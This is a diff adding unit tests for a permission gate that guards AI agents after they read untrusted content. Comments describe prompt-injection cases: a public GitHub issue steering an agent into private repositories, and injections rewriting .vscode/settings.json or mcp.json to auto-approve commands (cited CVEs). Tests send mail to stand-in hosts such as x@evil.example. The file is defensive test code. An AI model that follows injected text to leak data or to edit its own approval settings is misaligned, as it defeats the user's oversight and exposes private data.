@@ -899,6 +899,48 @@ describe('gate: a destination the user named by name', () => {
     expect(decision.kind).toBe('deny')
   })
 
+  it('a name in a field that is not a destination vouches for nothing', () => {
+    // Found by an outside review: Bash's description field held "Alice", the
+    // command had no atoms at all, and the call went through under the mark.
+    // A name counts only where the call is aimed.
+    const ctx = {
+      ...exposed(['alice']),
+      ...setup({ mode: 'autonomous', profile: { effects: ['read', 'create', 'exec'], resources: { paths: [], hosts: [] } } }),
+      exposure: EXPOSED,
+      userNames: ['alice'],
+    }
+    expect(gate({ tool: 'Bash', args: { command: 'sh cleanup.sh', description: 'Alice' } }, ctx).kind).toBe('deny')
+    expect(gate({ tool: 'wb_reply', args: { note: 'Alice', text: 'hi' } }, exposed(['alice'])).kind).toBe('deny')
+  })
+
+  it('a shell command is never aimed by a name', () => {
+    const ctx = {
+      ...setup({ mode: 'autonomous', profile: { effects: ['read', 'exec'], resources: { paths: [], hosts: [] } } }),
+      exposure: EXPOSED,
+      userNames: ['alice'],
+    }
+    expect(gate({ tool: 'Bash', args: { command: 'sh notify.sh', to: 'Alice' } }, ctx).kind).toBe('deny')
+  })
+
+  it('a role the policy declares makes a field a destination', () => {
+    // A server's own name for its recipient field is not on any built-in list.
+    const ctx = {
+      ...setup({ mode: 'autonomous', tools: { wb_reply: ['create'] }, arguments: { wb_reply: { addressee: 'destination' } } }),
+      exposure: EXPOSED,
+      userNames: ['alice'],
+    }
+    expect(gate({ tool: 'wb_reply', args: { addressee: 'Alice', text: 'hi' } }, ctx).kind).toBe('allow')
+  })
+
+  it('a role the policy declares can also take a field off the list', () => {
+    const ctx = {
+      ...setup({ mode: 'autonomous', tools: { wb_reply: ['create'] }, arguments: { wb_reply: { user: 'content' } } }),
+      exposure: EXPOSED,
+      userNames: ['alice'],
+    }
+    expect(gate({ tool: 'wb_reply', args: { user: 'Alice', text: 'hi' } }, ctx).kind).toBe('deny')
+  })
+
   it('a name does not lift a mark that came back through memory', () => {
     // The user said the name in this session; the note was written in an
     // earlier one, under a page's influence, and nothing the user said here
@@ -908,3 +950,97 @@ describe('gate: a destination the user named by name', () => {
   })
 })
 
+
+describe('gate: a resource the user did not name, after an untrusted read', () => {
+  // GitHub's MCP server, led from an issue in the public repository the user
+  // asked about into their private ones (Invariant Labs, May 2025). Every
+  // call on the way was a read or aimed at the named repository.
+  const EXPOSED = { at: 1, source: 'https://github.com/victim/pacman/issues/1' }
+  function ctx(words: string[], extra: Partial<Policy> = {}) {
+    return {
+      ...setup({ mode: 'autonomous', tools: { get_file_contents: ['read'], create_pull_request: ['create'] }, ...extra }),
+      exposure: EXPOSED,
+      userWords: words,
+    }
+  }
+
+  it('a read of a repository the user never named escalates', () => {
+    const decision = gate({ tool: 'get_file_contents', args: { owner: 'victim', repo: 'secret-plans', path: 'README.md' } }, ctx(['victim', 'pacman']))
+    expect(decision.kind).toBe('deny')
+    expect(decision.kind === 'deny' && decision.reason).toContain('secret-plans')
+  })
+
+  it('the repository the user named stays readable', () => {
+    expect(gate({ tool: 'get_file_contents', args: { owner: 'victim', repo: 'pacman', path: 'README.md' } }, ctx(['victim', 'pacman'])).kind).toBe('allow')
+    expect(gate({ tool: 'get_file_contents', args: { repository: 'victim/pacman', path: 'a.md' } }, ctx(['victim', 'pacman'])).kind).toBe('allow')
+  })
+
+  it('before any untrusted read nothing is asked', () => {
+    const clean = { ...ctx(['pacman']), exposure: null }
+    expect(gate({ tool: 'get_file_contents', args: { repo: 'secret-plans' } }, clean).kind).toBe('allow')
+  })
+
+  it('the policy can declare the resources of a task', () => {
+    const decision = gate({ tool: 'get_file_contents', args: { repo: 'secret-plans' } }, ctx(['pacman'], { destinations: ['secret-plans'] }))
+    expect(decision.kind).toBe('allow')
+  })
+})
+
+describe('gate: the task mandate for an autonomous agent', () => {
+  // No human names a destination during an autonomous run, so the owner
+  // declares them beforehand; everything else still escalates.
+  const EXPOSED = { at: 1, source: 'https://evil.example/ticket' }
+  function ctx(destinations: string[]) {
+    return {
+      ...setup({ mode: 'autonomous', tools: { send_email: ['export'] }, profile: { effects: ['read', 'export'], resources: { paths: [], hosts: [] } }, destinations }),
+      exposure: EXPOSED,
+    }
+  }
+
+  it('a destination the mandate declares passes under the mark', () => {
+    expect(gate({ tool: 'send_email', args: { to: 'ops@acme.example', body: 'summary' } }, ctx(['*@acme.example'])).kind).toBe('allow')
+    expect(gate({ tool: 'send_email', args: { to: 'ops@acme.example', body: 'summary' } }, ctx(['ops@acme.example'])).kind).toBe('allow')
+  })
+
+  it('anything else still escalates, and the refusal says how to proceed', () => {
+    const decision = gate({ tool: 'send_email', args: { to: 'x@evil.example', body: 'summary' } }, ctx(['*@acme.example']))
+    expect(decision.kind).toBe('deny')
+    expect(decision.kind === 'deny' && decision.reason).toContain('destinations')
+  })
+
+  it('a suffix does not match a lookalike host glued in front', () => {
+    expect(gate({ tool: 'send_email', args: { to: 'x@evilacme.example', body: 's' } }, ctx(['*@acme.example'])).kind).toBe('deny')
+  })
+})
+
+describe('gate: an agent config written after an untrusted read', () => {
+  // CVE-2025-53773 (Copilot): an injection wrote chat.tools.autoApprove into
+  // .vscode/settings.json and ran commands with no confirmation. CVE-2025-54135
+  // (Cursor): an injection rewrote mcp.json and the new server started. The
+  // user naming the file does not help: "fix the formatter in
+  // .vscode/settings.json" names exactly the path the page then aims at.
+  const EXPOSED = { at: 1, source: 'https://evil.example/readme' }
+  function ctx(exposed: boolean) {
+    return {
+      ...setup({ mode: 'autonomous', profile: { effects: ['read', 'create', 'update'], resources: { paths: [], hosts: [] } } }),
+      exposure: exposed ? EXPOSED : null,
+      userAtoms: ['.vscode/settings.json', '/work/app/.vscode/settings.json', '.mcp.json', '/work/app/.mcp.json'],
+    }
+  }
+
+  for (const file of ['/work/app/.vscode/settings.json', '/work/app/.vscode/tasks.json', '/work/app/.mcp.json', '/work/app/.vscode/mcp.json']) {
+    it(`writing ${file} escalates under the mark even when the user named it`, () => {
+      const decision = gate({ tool: 'Write', args: { file_path: file, content: '{}' } }, ctx(true))
+      expect(decision.kind).toBe('deny')
+      expect(decision.kind === 'deny' && decision.reason).toContain('agent configuration')
+    })
+  }
+
+  it('without an untrusted read the user edits their settings as usual', () => {
+    expect(gate({ tool: 'Write', args: { file_path: '/work/app/.vscode/settings.json', content: '{}' } }, ctx(false)).kind).toBe('allow')
+  })
+
+  it('reading a config under the mark is still a read', () => {
+    expect(gate({ tool: 'Read', args: { file_path: '/work/app/.mcp.json' } }, ctx(true)).kind).toBe('allow')
+  })
+})
